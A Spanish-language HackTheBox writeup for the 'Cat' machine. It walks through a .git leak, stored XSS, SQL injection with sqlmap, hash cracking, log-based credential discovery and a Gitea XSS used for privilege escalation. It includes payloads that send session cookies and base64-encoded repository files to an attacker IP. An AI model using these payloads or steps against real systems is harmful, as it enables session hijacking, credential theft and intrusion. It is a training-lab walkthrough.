---
layout: post
title:  "Writeup Cat"
date:   2025-07-05
categories: [Writeup, HackTheBox]
image: /images/writeup-cat/Pasted image 20250512223215.png
---

***Dificultad: Media***

***Sistema Operativo: Linux***

---------------------------------------------------------
\
hoy vamos a pwnear a este gato!

## Reconocimiento:
primero en nuestros directorios de trabajo, hare el primer escaneo con nmap a la ip disponible:
```bash
nmap -p- --open -sS -Pn -n -vvv --min-rate 5000 10.10.10.10 -oN puertos
```

nos reporta los puertos abiertos:
```
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
```
tenemos 2 puertos comunes en las maquinas 22ssh, y 80 http

y ahora a capturar banners con scripts de reconocimiento de nmap:
```bash
nmap -p22,80 -sCV -n -vvv 10.129.231.253 -oN objetivos
```

reporta:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/7/gBYFf93Ljst5b58XeNKd53hjhC57SgmM9qFvMACECVK0r/Z11ho0Z2xy6i9R5dX2G/HAlIfcu6i2QD9lILOnBmSaHZ22HCjjQKzSbbrnlcIcaEZiE011qtkVmtCd2e5zeVUltA9WCD69pco7BM29OU7FlnMN0iRlF8u962CaRnD4jni/zuiG5C2fcrTHWBxc/RIRELrfJpS3AjJCgEptaa7fsH/XfmOHEkNwOL0ZK0/tdbutmcwWf9dDjV6opyg4IK73UNIJSSak0UXHcCpv0GduF3fep3hmjEwkBgTg/EeZO1IekGssI7yCr0VxvJVz/Gav+snOZ/A1inA5EMqYHGK07B41+0rZo+EZZNbuxlNw/YLQAGuC5tOHt896wZ9tnFeqp3CpFdm2rPGUtFW0jogdda1pRmRy5CNQTPDd6kdtdrZYKqHIWfURmzqva7byzQ1YPjhI22cQ49M79A0yf4yOCPrGlNNzeNJkeZM/LU6p7rNJKxE9CuBAEoyh0=
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmL+UFD1eC5+aMAOZGipV3cuvXzPFlhqtKj7yVlVwXFN92zXioVTMYVBaivGHf3xmPFInqiVmvsOy3w4TsRja4=
|   256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOCpb672fivSz3OLXzut3bkFzO4l6xH57aWuSu4RikE
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://cat.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.

```
tenemos un host que agregare a mis /etc/hosts (virtualhosting)

```
10.10.10.10        cat.htb
```

primero, hare un escaneo con feroxbuster, para buscar directorios o rutas y tener una una idea de la pagina antes de pasa al navegador:
```bash
feroxbuster -u http://cat.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -n
```

ha reportado varias rutas:
```
http://cat.htb/vote.php
http://cat.htb/contest.php => http://cat.htb/join.php
http://cat.htb/winners.php
http://cat.htb/uploads => http://cat.htb/uploads/
http://cat.htb/css => http://cat.htb/css/
http://cat.htb/img => http://cat.htb/img/
http://cat.htb/css/styles.css
http://cat.htb/join.php
http://cat.htb/winners => http://cat.htb/winners/
```

además, hice varios escaneos mas para descubrir subdominios o directorios con herramientas como dirbuster, subfinder, amass, sublist3r, wfuzz, gobuster, etc

y cambiando de diccionario, con gobuster encontre cosas interesantes:
```bash
gobuster dir -u http://cat.htb/ -w  /usr/share/seclists/Discovery/Web-Content/common.txt
```

me reporto:
```
/.git/HEAD         (Status: 200) [Size: 23]
/.git/config       (Status: 200) [Size: 92]
/.git/index        (Status: 200) [Size: 1726]
/.git/logs/        (Status: 403) [Size: 272]
/.hta              (Status: 403) [Size: 272]
/.htaccess         (Status: 403) [Size: 272]
/.htpasswd         (Status: 403) [Size: 272]
/.git              (Status: 301) [Size: 301] 
/admin.php         (Status: 302) [Size: 1]
/css               (Status: 301) [Size: 300]
/img               (Status: 301) [Size: 300]
/index.php         (Status: 200) [Size: 3075]
/server-status     (Status: 403) [Size: 272]
/uploads           (Status: 301) [Size: 304]
```

muchas cosas interesantes!

el whatweb nos dice:
```
http://cat.htb [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.231.253], Title[Best Cat Competition]
```
competición de gatos haha

ahora si voy a la web, y ver que se puede enumerar antes de pasar a los otros directorios

panel principal:
<img src="/images/writeup-cat/Pasted image 20250513074216.png" alt="image">

hay un panel de inicio de registro:
<img src="/images/writeup-cat/Pasted image 20250513074333.png" alt="image">

y otro de inicio de sesión:

<img src="/images/writeup-cat/Pasted image 20250513074438.png" alt="image">

no tengo credenciales, asi que voy a crear una cuenta

hay un apartado para subir imágenes de gatos:

<img src="/images/writeup-cat/Pasted image 20250513074657.png" alt="image">

en el cual podría intentar cargar algún archivo malicioso

en el .git:

<img src="/images/writeup-cat/Pasted image 20250513080254.png" alt="image">

para los subdirectorios dado que no se pueden acceder desde la web, voy a usar una herramienta para traer a mi maquina todo el directorio git, ademas tambienel /admin.php redirecciona a la pagina de inicio de sesion, posiblemente esta buscando una cookie (lo que hace que no podamos probar cosas en ese panel)

pero vamos por parte:

primero, traigamos todo el .git, asi vemos credenciales o archivos de configuración o incluso la misma pagina:
```bash
python3 -m venv 3vilsec
source 3vilsec/bin/activate
pip install git-dumper
git-dumper http://cat.htb/.git .
```

y trajo mucho:

<img src="/images/writeup-cat/Pasted image 20250513081231.png" alt="image">

en la ruta .git/logs:
```
0000000000000000000000000000000000000000 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5 Axel <axel2017@gmail.com> 1725146774 +0000    commit (initial): Cat v1
```

al hacerle fuerza bruta con hashcat, no funcionó (parece un rabithole)


en el archivo admin.php y se nos muestra como extrae toda la data de la tabla cats en la base de datos, mas abajo en el codigo o mas adelante, veremos como se presenta esta información en el panel administrativo
```php

include 'config.php';

// Check if the user is logged in
if (!isset($_SESSION['username']) || $_SESSION['username'] !== 'axel') {
    header("Location: /join.php");
    exit();
}

// Fetch cat data from the database
$stmt = $pdo->prepare("SELECT * FROM cats");
$stmt->execute();
$cats = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>


```

además de que esta validando que seamos alex, teniendo eso en cuenta, mas el código, obviamente ya sabemos quien es el admin

tenemos en el archivo config.php el nombre y la ruta de una base de datos:
```php
<?php
// Database configuration
$db_file = '/databases/cat.db';
```
## XSS: 

el archivo contest para subir datos e imagenes de gatos tiene sanitizacion (no creo que se pueda aprovechar):
```php
/ Check if the form has been submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture form data
    $cat_name = $_POST['cat_name'];
    $age = $_POST['age'];
    $birthdate = $_POST['birthdate'];
    $weight = $_POST['weight'];

    $forbidden_patterns = "/[+*{}',;<>()\\[\\]\\/\\:]/";

    // Check for forbidden content
    if (contains_forbidden_content($cat_name, $forbidden_patterns) ||
        contains_forbidden_content($age, $forbidden_patterns) ||
        contains_forbidden_content($birthdate, $forbidden_patterns) ||
        contains_forbidden_content($weight, $forbidden_patterns)) {
        $error_message = "Your entry contains invalid characters.";
    } else {
        // Generate unique identifier for the image
        $imageIdentifier = uniqid() . "_";
```
aunque no bloquea:
```
| & % # @ "" caracteres de nueva linea
```

tambien intente subir el nombre del gato en urlencode, , aunque pasara el filtro, parece que lo estaba guardando de manera "literal" antes de mostrarlo.

estaba un poco atascado, volviendo a los archivos descargados, 

el admin.php esta tomando toda la data del gato que esta en la base de datos, evita las inyecciones sql con *prepare* y ejecuta la consulta para presentarle los gatos al admin

pero, en el join.php (que es donde nos registramos), no tenemos validación de caracteres en el nombre ni el email (solo se compara con la base de datos) 

y nuestro nombre de usuario forma parte de la data del gato, el cual "verá" el administrador:
contest.php
``` bash
if (move_uploaded_file($_FILES["cat_photo"]["tmp_name"], $target_file)) {
                // Prepare SQL query to insert cat data
                $stmt = $pdo->prepare("INSERT INTO cats (cat_name, age, birthdate, weight, photo_path, owner_username) VALUES (:cat_name, :age, :birthdate, :weight, :photo_path, :owner_username)");

```

además, de que es un formulario, y siempre en los formularios debemos probar xss haha!

mi buen nombre que prepare no podía ser el img src, porque no era una imagen así que:
```
<script>fetch('http://10.10.14.193/3vilsec?='+document.cookie);</script>
```

levantamos un servidor python en nuestra maquina:
```bash
python3 -m http.server 80
```

nos registramos con un nombre nada sospechoso:
<img src="/images/writeup-cat/Pasted image 20250515091233.png" alt="image">

y registramos a nuestro gato malvado
<img src="/images/writeup-cat/Pasted image 20250513180210.png" alt="image">

como resultado a los 30 seg:
<img src="/images/writeup-cat/Pasted image 20250515091340.png" alt="image">

tenemos una cookie! 

```
PHPSESSID=g0u6aq1u6p3nftveo8ipmkphi5
```

iniciando sesión, y cambiando la cookie desde las herramientas de navegador:
<img src="/images/writeup-cat/Pasted image 20250513181247.png" alt="image">

ahora tenemos disponible un panel administrativo pero enumerándolo, no encontramos nada, solo lo que habíamos visto en el directorio .git

cuando tenemos una solicitud de gato como la que acabamos de enviar tenemos esto, y podemos decidir si aceptar o rechazar a nuestro gato
<img src="/images/writeup-cat/Pasted image 20250515091516.png" alt="image">

en el código de admin.php, vemos que al mostrar el gato, lo hace de una forma insegura, que hace pensar en una inyección sql:
```php
<button class="view-button" onclick="window.location.href='/view_cat.php?cat_id=<?php echo htmlspecialchars($cat['cat_id']); ?>'">View</button>
            <button class="accept-button" onclick="acceptCat('<?php echo htmlspecialchars($cat['cat_name']); ?>', <?php echo htmlspecialchars($cat['cat_id']); ?>)">Accept</button>
            <button class="reject-button" onclick="rejectCat(<?php echo htmlspecialchars($cat['cat_id']); ?>)">Reject</button>

```

y después de intentar la inyección en esta parte,  no da resultados, dado que hay un script de limpieza que quita la data del gato rapido

## SQLi: 

pero, capturando los botones y mirando el código, tenemos otro candidato
*accept_cat.php* que es el botón de aceptar al gato
```php
$cat_name = $_POST['catName'];
$catId = $_POST['catId'];
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo->exec($sql_insert);

```

toma el catName y lo introduce a la base de datos con un exec

si te cuesta un poco entenderlo desde el código, puedes ver que en burpsuite capturando esta solicitud, logramos conseguir un error en el servidor:

solicitud normal:
<img src="/images/writeup-cat/Pasted image 20250515093324.png" alt="image">

solicitud con error en la base de datos:
<img src="/images/writeup-cat/Pasted image 20250515093352.png" alt="image">

modo de ataque:
primero vamos a copiar todo el archivo de la solicitud POST que estamos enviando desde burpsuite (lo usaremos con sqlmap)

vamos a guardarlo en un .txt y usaremos el siguiente comando para dumpear la base de datos:
```bash
sqlmap -r request.txt -p catName --dbms sqlite --level 5 --risk 3 --technique=BEST -T users -C username,password --dump
```

como sabemos que esa es la tabla y esas otras las columnas? por los archivos .git, específicamente el join.php (que es el formulario de registro), ahí vemos como se están introduciendo los datos en la db:
```php

// Registration process
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username'];
    $email = $_GET['email'];
    $password = md5($_GET['password']);

    $stmt_check = $pdo->prepare("SELECT * FROM users WHERE username = :username OR email = :email");
......
...
..
.

```
aunque el código aquí no esta completo, podemos ver el nombre de la tabla, y el nombre de las columnas

***Nota: recuerda actualizar la cookie antes de dumpear, dado que la maquina es un poco odiosa y la renueva cada 10 min aprox***

si no te funciona a la primera, tranquilo... elimina el archivo */home/user/.local/share/sqlmap/output/cat.htb* y lanza de nuevo el comando

después de esto, tenemos:

<img src="/images/writeup-cat/Pasted image 20250515094705.png" alt="image">

## Shell como rosa:

los he guardado en un archivo, y atacado con hashcat (el formato del hash es md5, podemos verlo entre los archivos del .git o en hashes.com )

```hashcat
 hashcat hashes  /usr/share/wordlists/rockyou.txt -m 0 --username
```

si te da problemas, te adelanto que el único en resolver es el de *rosa*:
```
rosa : ac369922d560f17d6eeb8b2c7dec498c : soyunaprincesarosa
```

y nos podemos conectar con ssh

<img src="/images/writeup-cat/Pasted image 20250515102155.png" alt="image">

pero aquí no esta la flag debemos hacer

## Movimiento Lateral: 

mirando el grupo del que es parte este usuario:
```
groups
```
veremos:
```
rosa adm
```

buscando archivos de grupo adm con find:
```bash
find / -group adm 2>/dev/null
```

tenemos acceso a los logs de la web!:
```
/var/log/audit
/var/log/audit/audit.log
/var/log/audit/audit.log.4
/var/log/audit/audit.log.1
/var/log/audit/audit.log.3
/var/log/audit/audit.log.2
/var/log/syslog.2.gz
/var/log/syslog.1
/var/log/kern.log.2.gz
/var/log/apt/term.log.2.gz
/var/log/apt/term.log.5.gz
/var/log/apt/term.log.4.gz
/var/log/apt/term.log.6.gz
/var/log/apt/term.log.3.gz
/var/log/apt/term.log
/var/log/apt/term.log.1.gz
/var/log/auth.log.1
/var/log/kern.log.1
/var/log/dmesg
/var/log/apache2
/var/log/apache2/access.log
/var/log/apache2/access.log.2.gz
/var/log/apache2/error.log.1
/var/log/apache2/error.log
/var/log/apache2/error.log.2.gz
/var/log/apache2/other_vhosts_access.log
/var/log/apache2/access.log.1
/var/log/kern.log
/var/log/installer
/var/log/installer/subiquity-server-info.log.2098
/var/log/installer/subiquity-server-debug.log.2098
/var/log/installer/installer-journal.txt
/var/log/installer/subiquity-curtin-install.conf
/var/log/installer/subiquity-client-info.log.2048
/var/log/installer/autoinstall-user-data
/var/log/installer/subiquity-curtin-apt.conf
/var/log/installer/subiquity-client-debug.log.2048
/var/log/mail.log
/var/log/auth.log.2.gz
/var/log/mail.log.2.gz
/var/log/mail.log.1
/var/log/cloud-init.log
/var/log/syslog
/var/log/cloud-init-output.log
/var/log/auth.log
/var/spool/rsyslog
/etc/hostname
/etc/cloud/cloud.cfg.d/99-installer.cfg
/etc/cloud/ds-identify.cfg
/etc/hosts

```

mirando /var/log/syslog:
<img src="/images/writeup-cat/Pasted image 20250515103550.png" alt="image">
root esta ejecutando un script de limpieza para un gitea (puede ser la escalada?)
además de que esta enviando un email (es una tarea cron)

tambien en el /var/log/apache2/access.log vemos las credenciales del usuario axel que es otro usuario con un directorio /home:
<img src="/images/writeup-cat/Pasted image 20250515104044.png" alt="image">
***aNdZwgC4tI9gnVXv_e3Q***

<img src="/images/writeup-cat/Pasted image 20250515104330.png" alt="image">

aquí tendremos la ***Flag del usuario***

## Escalada de Privilegios:

antes encontramos que root, estaba enviando email, así que iré a /var/mail

el axel tenemos un puerto con detalles de un repositorio:
<img src="/images/writeup-cat/Pasted image 20250515104846.png" alt="image">
**http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md**

(no se puede leer los otros emails)

pero mirando las herramientas disponibles para enviar correos a usuarios locales desde la terminal, tenemos wall, write y sendmail (wall y write necesitan que el usuario este conectado en la red para poder enviarle un mail)
```bash
compgen -c | grep "mail"
```


vamos a traer el puerto abierto con ssh del usuario axel
```bash
ssh -L 3000:127.0.0.1:3000 axel@10.10.10.10
```


tenemos:
<img src="/images/writeup-cat/Pasted image 20250515105339.png" alt="image">


aunque hay 3 usuarios, no hay repositorios o no puedo ver nada mas allá o la ruta que se menciona en el mail aunque si es posible iniciar sesión como axel 

en el mail, vemos que nos piden crear un repositorio y que otro usuario podrá verlo, jobert

mirando vulnerabilidades para gitea, tenemos un xss que se hace a través de un repositorio y coincide con la versión del gitea que esta presente:

<img src="/images/writeup-cat/Pasted image 20250515111113.png" alt="image">
https://www.exploit-db.com/exploits/52077

primer intento a ver si había alguna cookie que robar dado que el escenario es como el anterior:

<img src="/images/writeup-cat/Pasted image 20250515193622.png" alt="image">

al principio no me daba respuesta, pero luego de leer el correo, veo que debemos añadir un README.md al repositorio cuando lo creemos:
<img src="/images/writeup-cat/Pasted image 20250515193744.png" alt="image">

enviamos el correo con mensaje:
```bash
echo -e "new 3vilrepo check if  http://localhost:3000/axel/3vilrepo1" | sendmail jobert@localhost
```

no existía ninguna cookie:
<img src="/images/writeup-cat/Pasted image 20250515193418.png" alt="image">
lo intente con nc porque no me gustaba como python mostraba la data

así que bueno, y si intentamos que nos devuelva la data entera el admin? la data que tiene  en su repo? hacerle una doble redireccion?
primero creamos el xss con la solicitud, combinando el payload de la vulnerabilidad + el usado la vez anterior + uno nuevo que nos enviara la data:

<img src="/images/writeup-cat/Pasted image 20250515193256.png" alt="image">

tenemos:
<img src="/images/writeup-cat/Pasted image 20250515194322.png" alt="image">
si lo convertimos desconvertimos de base64:
<img src="/images/writeup-cat/Pasted image 20250515194425.png" alt="image">

nos esta devolviendo la data, asi que bueno, que mas nos podemos traer? todo proyecto debe tener un index, y vimos que la maquina trabaja con php, asi que probando con:
```javascript
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(r=>r.text()).then(d=>fetch('http://10.10.14.193:4444/?data='+encodeURIComponent(btoa(d))));">3vilsec</a>
```

*siguiendo los pasos anteriores*

tenemos:
<img src="/images/writeup-cat/Pasted image 20250515194630.png" alt="image">

si probamos estas creds como root:

<img src="/images/writeup-cat/Pasted image 20250515192908.png" alt="image">

------------------------
\
nos vemos en la siguiente maquina! 

## H4ck th3 W0rld

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">